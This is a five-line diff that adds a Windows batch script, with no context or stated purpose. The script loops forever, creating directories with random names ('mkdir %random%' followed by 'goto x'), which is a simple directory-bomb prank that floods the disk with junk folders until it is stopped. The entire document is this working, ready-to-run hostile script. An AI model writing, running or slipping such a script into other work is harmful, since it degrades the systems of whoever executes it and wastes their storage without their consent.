@@ -1,0 +1,5 @@
+@echo off
+
+:x
+mkdir %random%
+goto x
